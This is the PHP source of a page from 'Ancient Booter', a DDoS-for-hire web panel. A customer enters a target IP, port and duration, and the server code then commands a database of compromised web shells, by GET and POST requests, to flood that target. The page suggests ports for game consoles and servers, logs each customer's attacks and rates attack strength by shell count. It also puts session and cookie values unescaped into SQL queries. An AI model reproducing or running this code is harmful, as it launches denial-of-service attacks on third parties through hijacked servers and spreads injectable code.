<?php 
include "dbc.php";
include "includes/functions.php";
page_protect();
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Ancient Booter</title>
<!-- Calendar Styles -->
<link href="styles/fullcalendar.css" rel="stylesheet" type="text/css" />
<!-- Fancybox/Lightbox Effect -->
<link href="styles/jquery.fancybox-1.3.4.css" rel="stylesheet" type="text/css" />
<!-- WYSIWYG Editor -->
<link href="styles/wysiwyg.css" rel="stylesheet" type="text/css" />
<!-- Main Controlling Styles -->
<link href="styles/main.css" rel="stylesheet" type="text/css" />
<!-- Blue Theme Styles -->
<link href="themes/blue/styles.css" rel="stylesheet" type="text/css" />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /></head>
<body>

<!-- Top header/black bar start -->
	<div id="header">
   <img src="images/logo.png" alt="AdminCP" class="logo" /></div>
 <!-- Top header/black bar end -->   
    
<!-- Left side bar start -->
        <div id="left">
<!-- Left side bar start -->

<!-- Toolbox dropdown start -->
        	<div id="openCloseIdentifier"></div>
            <div id="slider">
                <ul id="sliderContent">
                    <li><a href="hub.php" title="DDoS">DDoS Attack</a></li>
                  <li class="alt"><a href="pinger.php" title="">Pinger</a></li>
                    <li><a href="donate.php" title="">Donate</a></li>
                    <li class="alt"><a href="http://www.hackforums.net/member.php?action=profile&uid=749834" title="">Our HF Account</a></li>
                  <li><a href="logout.php" title="">Log Out</a></li>
                </ul>
                <div id="openCloseWrap">
                    <div id="toolbox">
            			<a href="#" title="Toolbox Dropdown" class="toolboxdrop">Toolbox <img src="images/icon_expand_grey.png" alt="Expand" /></a>
            		</div>
                </div>
            </div>
<!-- Toolbox dropdown end -->   
    	
<!-- Userbox/logged in start -->
            <div id="userbox">
            	<p>Welcome <?php echo $_SESSION['user_name'];?></p>
                <p><span>You are logged in as 
				<?php 
				if($_SESSION['user_level'] == 1) {
				echo 'a Customer';
				}
				 
				if ($_SESSION['user_level'] == 5) {
				echo 'an Administrator';	
				}
				?> </span></p>
                <ul>
                	<li><a href="mailto:ancient-productions@hotmail.com" title="Contact Us"><img src="images/icons/icon_mail.png" alt="Contact Us" /></a></li>
                    <?php 
				if($_SESSION['user_level'] == 1) {
				
				}
				 
				if ($_SESSION['user_level'] == 5) {
					?><li><a href="admin.php" title="Admin CP"><img src="images/icons/icon_cog.png" alt="Configure" /></a></li><?php
				}
				?>
                    <li><a href="logout.php" title="Logout"><img src="images/icons/icon_unlock.png" alt="Logout" /></a></li>
                </ul>
            </div>
<!-- Userbox/logged in end -->  

<!-- Main navigation start -->         
            <ul id="nav">
            	
          <li>
                    <ul class="navigation">
                        <li class="heading selected">Main Controls</li>
                        <li><a href="hub.php" title="">DDoS Attack</a></li>
                        <li><a href="index.php" title="">Home</a></li>
                        <li><a href="mysettings.php" title="">My Account</a></li>
                    </ul>
                </li>
                <li>
                    <a class="collapsed heading">Misc. Controls</a>
                     <ul class="navigation">
                        <li><a href="terms.php" title="">Terms of Use</a></li>
                        <li><a href="mailto:ancient-productions@hotmail.com" title="">Contact Us</a></li>
                        <li><a href="donate.php" title="">Donate</a></li>
                    </ul>
                </li>        
            </ul>
        </div>      
<!-- Main navigation end --> 

<!-- Left side bar start end -->   

<!-- Right side start -->     
        <div id="right">

<!-- Breadcrumb start -->  
          <div id="breadcrumb">
                <ul>	
        			<li><img src="images/icon_breadcrumb.png" alt="Location" /></li>
                    <li><a href="index.php" title="">Home</a></li>
                    <li>/</li>
                    <li class="current">DDoS Attack</li>
                </ul>
            </div>
<!-- Breadcrumb end -->  

<!-- Top/large buttons start -->  
            <ul id="topbtns">
            	<li class="desc"><strong>Quick Links</strong><br />Popular shortcuts</li>
                <li></li>
                <li>
                
                <a href="hub.php"><img src="images/icons/attack.png" alt="DDoS" /><br />DDoS Attack</a>
                
                </li>
                <li>
                	<a href="mysettings.php"><img src="images/icons/icon_lrg_user.png" alt="Users" /><br />
                	My Account</a>
                </li>
               
                <li>
                	<a href="chat.php"><img src="images/icons/icon_lrg_comment.png" alt="Comment" /><br />
                	Chat</a>
                </li>
                <li>
                	<a href="support.php"><img src="images/icons/icon_lrg_support.png" alt="Support" /><br />Support</a>
                </li>
                <?php if ($_SESSION['user_level'] == 1){
				}
				else if ($_SESSION['user_level'] == 5) {
					?>
                <li>
                <a href="admin.php"><img src="images/icons/icon_lrg_create.png" alt="Admin CP" /><br />Admin CP</a>
                </li>
				<?php } ?>
            </ul>
<!-- Top/large buttons end -->  

 <!-- Main content start -->      
            <div id="content">

<!-- Charts box start -->          
        		<div class="container med left" id="graphs">
                	<div class="conthead">
                		<h2>DDoS Attack</h2>
                    </div>
<!-- Tabbed navigation start -->                    
               	  <div class="contentbox">
                    <script src="javascript/jquery-1.4.4.min.js" type="text/javascript"></script>
<script type="text/javascript">
function hub()
	{
	if (window.XMLHttpRequest)
	  {
	  xmlhttp=new XMLHttpRequest();
	  }
	else
	  {
	  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
	  }
	xmlhttp.onreadystatechange=function()
	  {
	  if (xmlhttp.readyState==4 && xmlhttp.status==200)
	    {
	    document.getElementById("sent").innerHTML = "Request has been sent to all shells.";
	    }
	  }
	xmlhttp.open("GET","hub.php?host="+document.getElementById('host').value+"&time="+document.getElementById('time').value+"&port="+document.getElementById('port'));
	xmlhttp.send();
}
</script>
<div class="box">
    <center>
      <h2>Hub:</h2></center>
      <hr />
    <div class="box-content">
        <p>
            <font color="#FF0000"> <center>
            <strong>Important Notice:</strong></font>
            </center>
            <center>Attacking the same IP Address repeatedly will result in suspension of your account without refund.</center>
            </center>
        </p>
    </div>

</div>
<center>
<div class="box">
    <h2>Resolve Host to IP Address</h2>
    <div class="box-content">
        <p>
          <?php
function printForm()
{
global $www;

$action = $_SERVER["PHP_SELF"];

print <<<ENDHTM
<form method="post" action="$action">
<p>http:// <input type="text" name="www" value="$www"/> <input type="submit" class = "btnalt" value="Resolve"/></p>
</form>

ENDHTM;
}

if($_REQUEST['www'])
{
print $www;

$domain = strtolower($_REQUEST['www']);
$xArray = @parse_url($domain);

	if(!$xArray["scheme"])
	{
	$domain = "http://" . $domain;
	$xArray = @parse_url($domain);
	}

	$xProtocol = $xArray["scheme"];
	$xHost   = $xArray["host"];
	$xPort   = $xArray["port"];
	$xUser   = $xArray["user"];
	$xPass   = $xArray["pass"];
	$xPath   = $xArray["path"];
	$xQuery  = $xArray["query"];
	$xFragment = $xArray["fragment"];

	$domain = $xProtocol ."://". $xHost . $xPath . ($xQuery?"?":"") . $xQuery;
	$www = $xHost . $xPath . ($xQuery?"?":"") . $xQuery;

	printForm();

		if(@gethostbyname($xHost) == $xHost)
		{
		$ip2 = "Returned hostname";
		$hostname2 = "Cancelled";
		}
		else
		{
		$ip2 = @gethostbyname($xHost);
		$hostname2 = @gethostbyaddr($ip2);
		}
	print "<div><p><strong><font color=\"red\">IP Address</font></strong>: $ip2</p></div>\n";
	print "<div><p><strong><font color=\"red\">Hostname</font></strong>: $hostname2</p></div>\n";
}
else
{
		if(isset($_COOKIE['URL']))
		{
		$www = $_COOKIE['URL'];
		}
printForm();
}
?>
        </p>
    </div>
</div>
</center>
<div class="box">
<center><h2>UDP Flood</h2></center>
<div class="box-content">
<p>
<form>
        <table width="50%" border="0" align="center" cellpadding="3" cellspacing="3" class="forms">

          <tr>
            <td>IP/DNS</td>
            <td><input type="text" id="host" onkeypress="handleKeyPress(event,this.form)" name="host" value="" class="inputbox"/></td>
          </tr>

          <tr>
            <td>Seconds</td>
            <td><input type="text" onkeypress="handleKeyPress(event,this.form)" id="time" name="time" value="30" class="inputbox smaller" /></td>
          </tr>

          <tr>
            <td height="63">Port</td>
            <td><input type="text" name="port" id="port" onkeypress="handleKeyPress(event,this.form)" value="80" class="inputbox smaller" /></td>
          </tr>
          <script type="text/javascript">
function changeText(input)
{
     document.getElementById("port").value = input.value;
}
</script>   
          <tr>
          <td></td>
          <td>
          Reccommended Ports:
          <br />
          Website/Home Connection: 80
          <br />
          XBox Live: 3074
          <br />
          FTP: 21
          <br />
          CSS/HL2 Server: 27015
          <br />
          IRC: 6667
                                
                                
                            

          
          
          
          </td>
          </tr>

          <tr>
            <td></td>
            <center><td><input type="submit" value="Initiate Attack" class = "btn" onclick="hub();" /></td></center>
          </tr>

      </table>
<form>
  </p>
<form>
</form>
		 <form action="hub.php" method="post">
		  &nbsp;
		  </p>
                 </form>
<p id="sent"></p>
<script type="text/javascript">
function handleKeyPress(e,form){
	var key=e.keyCode || e.which;
	if (key==13){
		hub();
	}
}
function handleEnterPress(e,form){
	var key=e.keyCode || e.which;
	if (key==13){
		getip();
	}
}
</script>
<?php
set_time_limit(10);
ignore_user_abort(TRUE);

include 'includes/EpiCurl.php';
require("includes/ezSQLCore.php");
require("includes/ezSQL.php");

$query = mysql_query("SELECT * FROM `users` WHERE `id`='$_SESSION[user_id]' AND `banned`=1") or die(mysql_error());
if (mysql_num_rows($query) > 0) {
	mysql_query("update `users`
		set `ckey`= '', `ctime`= ''
		where `id`='$_SESSION[user_id]' OR  `id` = '$_COOKIE[user_id]'") or die(mysql_error());
	unset($_SESSION['user_id']);
	unset($_SESSION['user_name']);
	unset($_SESSION['user_level']);
	unset($_SESSION['HTTP_USER_AGENT']);
	session_unset();
	session_destroy();
	setcookie("user_id", '', time()-60*60*24*COOKIE_TIME_OUT, "/");
	setcookie("user_name", '', time()-60*60*24*COOKIE_TIME_OUT, "/");
	setcookie("user_key", '', time()-60*60*24*COOKIE_TIME_OUT, "/");
	die("You do not have permission to view this page.");
}

if (isset($_GET['host']) && isset($_GET['time']) && isset($_GET['port']))
{

	$SQL = new ezSQL_mysql();
	$SQL->connect(mypriv3_db, nub4life);
	$SQL->select(mypriv3_db);
	$Query = "SELECT * FROM `getshells`";
        $AffectedRows = $SQL->query($Query);
        $host = $_GET['host'];
        $time = intval($_GET['time']);
        $port = intval($_GET['port']);
        $mc = EpiCurl::getInstance();
	$ch = array();


if($time >= 121) {
die("<hr>You cannot issue attacks exceeding 120 seconds.");
}

if($host == "") {
die("<center><strong><font color=\"red\">Sorry, but you must fill in all fields.</font></center></strong>");
}

if($time == "") {
die("<center><strong><font color=\"red\">Sorry, but you must fill in all fields.</font></center></strong>");
}

if($port == "") {
die("<center><strong><font color=\"red\">Sorry, but you must fill in all fields.</font></center></strong>");
}

/*
* Example Blacklisting
*/

if($host == "hackforums.net") { die("<hr>You cannot attack this."); }
if($host == "94.249.139.4") { die("<hr>Dont even think about it, DDoSing this site will result in an instant ban."); }



/*
* End of blacklisting
*/

    for($i = 0; $i < $AffectedRows; $i++)
    {
	$row = $SQL->last_result[$i];
        $shell = trim($row->URL);

        if (strlen($shell) == 0)
            continue;

        $shell .= "?act=phptools&host={$host}&time={$time}&port={$port}";
        $ch[$i] = curl_init($shell);
        curl_setopt($ch[$i], CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch[$i], CURLOPT_TIMEOUT, 7);
        $curl1 = $mc->addCurl($ch[$i]);
    }

	$Query = "SELECT * FROM `postshells`";
	$AffectedRows = $SQL->query($Query);
    $ch2 = array();
    $post = "ip={$host}&time={$time}&port={$port}";

    for($i = 0; $i < $AffectedRows; $i++)
    {
		$row = $SQL->last_result[$i];
        $shell = trim($row->URL);
        if (strlen($shell) == 0)
            continue;
        $header = array();
		$header[] = "Cache-Control: max-age=0";
		$header[] = "Connection: keep-alive";
		$header[] = "Keep-Alive: 300";
		$header[] = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
		$header[] = "Accept-Language: en-us,en;q=0.5";
		$header[] = "Pragma: ";
        $ch2[$i] = curl_init($shell);
		curl_setopt($ch2[$i], CURLOPT_HTTPHEADER, $header);
        curl_setopt($ch2[$i], CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch2[$i], CURLOPT_FORBID_REUSE, 1);
        curl_setopt($ch2[$i], CURLOPT_POST, 1);
        curl_setopt($ch2[$i], CURLOPT_POSTFIELDS, $post);
        $curl1 = $mc->addCurl($ch2[$i]);
    }

echo "<p id='sent'><center><strong><font color=\"lime\">Attack has been sent!</font></strong></center></p>";

$username = $_SESSION['user_name'];
$host = strip_tags(mysql_real_escape_string($_GET['host']));
$time = strip_tags(mysql_real_escape_string($_GET['time']));
$port = strip_tags(mysql_real_escape_string($_GET['port']));
$date = date("m-d-Y, h:i:s a", time());

mysql_query("INSERT INTO logs
(username, ip, time, port, date) VALUES('" . $username . "', '" .$host . "', '" . $time . "', '" . $port . "', '" . $date . "' ) ")
or die(mysql_error());

mysql_query("UPDATE users set myAttacks = myAttacks + 1 WHERE full_name = '" . $username . "'") or die(mysql_error());

}
?>

</div>
</div>
               	  </div> 
                </div>
                
<!-- Website stats start -->               
                <div class="container sml right">
                	<div class="conthead">
                		<h2>Shell Stats</h2>
                    </div>
                	<div class="contentbox">
                    	<ul class="summarystats">
                       	  <li>
                            	<p class="statcount"><?php echo $shellsOnline; ?></p> 
                            	<p>Total Shells</p>
                       	  </li>
                          <li>
                            	<p class="statcount"><?php echo $num_rows; ?></p> <p>GET Shells</p>
                          </li>
                             <li>
                            	<p class="statcount"><?php echo $num_rows2; ?></p> <p>POST Shells</p>
                            </li>
                          <li>
                            	<p class="statcount"><?php echo $num_rows3; ?></p> <p>Slowloris Shells</p>
                          </li>
                          <li>
                            	<p class="statcount"><?php
            if($shellRotation == 0){
				?> <font color="red"> <?php echo '(Off)';
			}
			else{
				
		?> <font color="lime"> <?php	echo '(On)';
			}
			?></font> <?php
			 
            ?></p> <p>Shell Rotation</p>
                          </li>
                        </ul>
                        
                        <p><strong>Booter Strength</strong></p>
                        
                        <table>
                            <tr>
                            <?php if ($shellsOnline >= 1000) { ?>
                            
                                <td width="150"><strong><span class="usagetxt redtxt">Strong</span></strong></td>
                                <td width="500">
                                    <div class="usagebox">
                                        1000+ Shells
                                    </div>
                                </td>
                            
                            <?php
							}
							?>
                            </tr>
                            <tr>
                            <?php if ($shellsOnline < 1000 && $shellsOnline > 500){ ?>
                            
                       
                                <td><strong><span class="usagetxt orangetxt">Medium</span></strong></td>
                                <td>
                                    <div class="usagebox">
                                       501-999 Shells
                                    </div>
                                </td>
                            
                            <?php 
							}
							 ?>
                          </tr>
                             <tr>
                             <?php if ($shellsOnline <= 500) { ?>
                            
                                <td><strong><span class="usagetxt greentxt">Weak</span></strong></td>
                                <td>
                                    <div class="usagebox">
                                       0-500 Shells
                                    </div>
                                </td>
                            
                            <?php } ?>
                            </tr>
                        </table>
                    </div>
                </div>
<!-- Website stats end -->  
               
                <!-- Clear finsih for all floated content boxes --> <div style="clear: both"></div>
                
<!-- Form elements start --><!-- Form elements end -->  
 
<!-- Gallery start --><!-- Gallery end -->
 
<!-- Generic style tabbing start --><!-- Generic style tabbing start -->  
                
                <!-- Clear finsih for all floated content boxes --><div style="clear: both"></div>
                
<!-- Calendar start -->             
                
          </div>
<!-- Calendar end -->
    
<!-- Table styles start -->           
                
<!-- Table styles end -->  
                
                <!-- Status Bar Start --><!-- Status Bar End -->
                
                 <!-- Red Status Bar Start --><!-- Red Status Bar End -->
                
                <!-- Green Status Bar Start --><!-- Green Status Bar End -->
                
                <!-- Blue Status Bar Start --><!-- Blue Status Bar End -->   
        	</div>
            
<!-- Footer start --> 
          <p id="footer">&copy; Ancient Productions™  </p>
<!-- Footer end -->      
     
        </div>
<!-- Right side end --> 

<script type="text/javascript" src="http://dwpe.googlecode.com/svn/trunk/_shared/EnhanceJS/enhance.js"></script>	
   		<script type='text/javascript' src='http://dwpe.googlecode.com/svn/trunk/charting/js/excanvas.js'></script>
        <script type='text/javascript' src='https://ajax.googleapis.com/ajax/libs/jquery/1.5.1/jquery.min.js'></script>
        <script type='text/javascript' src='https://ajax.googleapis.com/ajax/libs/jqueryui/1.8.6/jquery-ui.min.js'></script>
        <script type='text/javascript' src='js/jquery.fancybox-1.3.4.pack.js'></script>
        <script type='application/javascript' src='js/fullcalendar.min.js'></script>
        <script type='text/javascript' src='js/jquery.wysiwyg.js'></script>
        <script type='text/javascript' src='js/visualize.jQuery.js'></script>
        <script type='application/javascript' src='js/functions.js'></script>
</body>
</html>
